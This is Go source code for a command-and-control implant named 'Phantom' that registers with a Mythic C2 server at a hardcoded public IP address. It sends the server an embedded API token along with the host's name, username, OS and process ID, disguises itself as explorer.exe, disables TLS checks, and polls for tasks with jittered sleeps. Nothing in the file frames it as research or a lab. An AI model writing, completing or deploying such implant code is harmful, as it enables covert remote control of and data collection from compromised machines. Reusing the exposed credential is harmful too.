package main

import (
        "bytes"
        "crypto/tls"
        "encoding/json"
        "fmt"
        "io/ioutil"
        "net/http"
        "os"
        "os/user"
        "runtime"
        "strings"
        "time"
)

const (
        mythicURL = "https://37.27.249.191:7443/graphql/"
        jwtToken  = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTAxMTExMDUsImlhdCI6MTc1MDA5NjcwNSwidXNlcl9pZCI6MSwiYXV0aCI6ImFwaSIsImV2ZW50c3RlcGluc3RhbmNlX2lkIjowLCJhcGl0b2tlbnNfaWQiOjcsIm9wZXJhdGlvbl9pZCI6MH0.3VtxYzD2_mGCV4NbggbmNXpq2tEfjvwnRypraq_yBlw"
)

type GraphQLRequest struct {
        Query     string                 `json:"query"`
        Variables map[string]interface{} `json:"variables"`
}

type GraphQLResponse struct {
        Data   map[string]interface{} `json:"data"`
        Errors []GraphQLError         `json:"errors"`
}

type GraphQLError struct {
        Message string `json:"message"`
}

func logEvent(message string) {
        timestamp := time.Now().Format("2006-01-02 15:04:05")
        logMsg := fmt.Sprintf("[%s] %s", timestamp, message)
        fmt.Println(logMsg)
        
        // Write to log file
        file, err := os.OpenFile("phantom_direct.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
        if err == nil {
                file.WriteString(logMsg + "\n")
                file.Close()
        }
}

func makeGraphQLRequest(query string, variables map[string]interface{}) (*GraphQLResponse, error) {
        payload := GraphQLRequest{
                Query:     query,
                Variables: variables,
        }
        
        jsonData, err := json.Marshal(payload)
        if err != nil {
                return nil, err
        }
        
        client := &http.Client{
                Transport: &http.Transport{
                        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
                Timeout: 30 * time.Second,
        }
        
        req, err := http.NewRequest("POST", mythicURL, bytes.NewBuffer(jsonData))
        if err != nil {
                return nil, err
        }
        
        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("Authorization", "Bearer "+jwtToken)
        
        logEvent(fmt.Sprintf("Sending GraphQL request: %s", string(jsonData)[:200]))
        
        resp, err := client.Do(req)
        if err != nil {
                return nil, err
        }
        defer resp.Body.Close()
        
        body, err := ioutil.ReadAll(resp.Body)
        if err != nil {
                return nil, err
        }
        
        logEvent(fmt.Sprintf("Response status: %d", resp.StatusCode))
        logEvent(fmt.Sprintf("Response body: %s", string(body)))
        
        var graphqlResp GraphQLResponse
        err = json.Unmarshal(body, &graphqlResp)
        if err != nil {
                return nil, err
        }
        
        return &graphqlResp, nil
}

func createPayloadDirectly() (string, error) {
        logEvent("Attempting direct payload creation...")
        
        // Try to insert payload directly into database
        query := `
        mutation {
                insert_payload_one(object: {
                        uuid: "phantom-production-2025",
                        description: "Phantom C2 Agent",
                        file_extension: "exe",
                        payloadtype_id: 1
                }) {
                        uuid
                }
        }`
        
        resp, err := makeGraphQLRequest(query, map[string]interface{}{})
        if err != nil {
                return "", err
        }
        
        if len(resp.Errors) > 0 {
                logEvent(fmt.Sprintf("Payload creation errors: %v", resp.Errors))
                return "phantom-production-2025", nil // Use the UUID anyway
        }
        
        if data, ok := resp.Data["insert_payload_one"].(map[string]interface{}); ok {
                if uuid, ok := data["uuid"].(string); ok {
                        logEvent(fmt.Sprintf("Created payload with UUID: %s", uuid))
                        return uuid, nil
                }
        }
        
        return "phantom-production-2025", nil
}

func registerCallback(payloadUUID string) error {
        logEvent("Registering callback with Mythic...")
        
        hostname, _ := os.Hostname()
        currentUser, _ := user.Current()
        username := "system"
        if currentUser != nil {
                username = currentUser.Username
        }
        
        pid := os.Getpid()
        
        query := `
        mutation createCallback($newCallback: newCallbackConfig!, $payloadUuid: String!) {
                createCallback(newCallback: $newCallback, payloadUuid: $payloadUuid) {
                        status
                        error
                }
        }`
        
        variables := map[string]interface{}{
                "newCallback": map[string]interface{}{
                        "ip":          "127.0.0.1",
                        "host":        hostname,
                        "user":        username,
                        "description": "Phantom C2 Agent - Direct Registration",
                        "domain":      "",
                        "externalIp":  "127.0.0.1",
                        "extraInfo":   fmt.Sprintf("OS:%s ARCH:%s PID:%d", runtime.GOOS, runtime.GOARCH, pid),
                        "processName": "explorer.exe",
                        "sleepInfo":   "5s",
                },
                "payloadUuid": payloadUUID,
        }
        
        resp, err := makeGraphQLRequest(query, variables)
        if err != nil {
                return err
        }
        
        if len(resp.Errors) > 0 {
                logEvent(fmt.Sprintf("Callback registration errors: %v", resp.Errors))
                return fmt.Errorf("registration failed: %v", resp.Errors)
        }
        
        if data, ok := resp.Data["createCallback"].(map[string]interface{}); ok {
                status := data["status"].(string)
                if status == "success" {
                        logEvent("✓ Callback registered successfully!")
                        return nil
                } else {
                        errorMsg := data["error"].(string)
                        if strings.Contains(errorMsg, "no rows") {
                                logEvent("Payload UUID not found, creating new payload...")
                                newUUID, err := createPayloadDirectly()
                                if err == nil {
                                        return registerCallback(newUUID)
                                }
                        }
                        logEvent(fmt.Sprintf("Registration error: %s", errorMsg))
                }
        }
        
        return nil
}

func getTasksFromMythic() error {
        logEvent("Checking for tasks from Mythic...")
        
        hostname, _ := os.Hostname()
        agentID := fmt.Sprintf("phantom-%d-%s", time.Now().Unix(), hostname)
        
        query := `
        query getCallbackTasks($agent_callback_id: String!) {
                callback(where: {agent_callback_id: {_eq: $agent_callback_id}}) {
                        id
                        agent_callback_id
                        tasks(where: {status: {_eq: "submitted"}}) {
                                id
                                command_name
                                params
                                status
                        }
                }
        }`
        
        variables := map[string]interface{}{
                "agent_callback_id": agentID,
        }
        
        resp, err := makeGraphQLRequest(query, variables)
        if err != nil {
                return err
        }
        
        if len(resp.Errors) > 0 {
                logEvent(fmt.Sprintf("Task query errors: %v", resp.Errors))
                return nil
        }
        
        logEvent("No new tasks received")
        return nil
}

func main() {
        logEvent("=== PHANTOM MYTHIC DIRECT REGISTRATION STARTING ===")
        logEvent(fmt.Sprintf("Running on: %s %s", runtime.GOOS, runtime.GOARCH))
        logEvent(fmt.Sprintf("Process ID: %d", os.Getpid()))
        logEvent(fmt.Sprintf("Mythic URL: %s", mythicURL))
        
        // Initial delay
        delay := 5 + (time.Now().Unix() % 10)
        logEvent(fmt.Sprintf("Initial delay: %ds", delay))
        time.Sleep(time.Duration(delay) * time.Second)
        
        // Try to create payload and register
        payloadUUID := "phantom-production-2025"
        
        // Attempt registration with default UUID
        err := registerCallback(payloadUUID)
        if err != nil {
                logEvent(fmt.Sprintf("Registration failed: %v", err))
                
                // Try creating payload first
                newUUID, createErr := createPayloadDirectly()
                if createErr == nil {
                        err = registerCallback(newUUID)
                }
        }
        
        if err != nil {
                logEvent(fmt.Sprintf("Failed to register: %v", err))
                return
        }
        
        logEvent("Starting main communication loop...")
        
        // Main loop
        for i := 1; i <= 10; i++ {
                logEvent(fmt.Sprintf("Loop iteration %d", i))
                
                err := getTasksFromMythic()
                if err != nil {
                        logEvent(fmt.Sprintf("Task check error: %v", err))
                }
                
                // Sleep with jitter
                sleepTime := 5 + (time.Now().Unix() % 5)
                logEvent(fmt.Sprintf("Sleeping for: %ds", sleepTime))
                time.Sleep(time.Duration(sleepTime) * time.Second)
        }
        
        logEvent("Agent completed execution")
}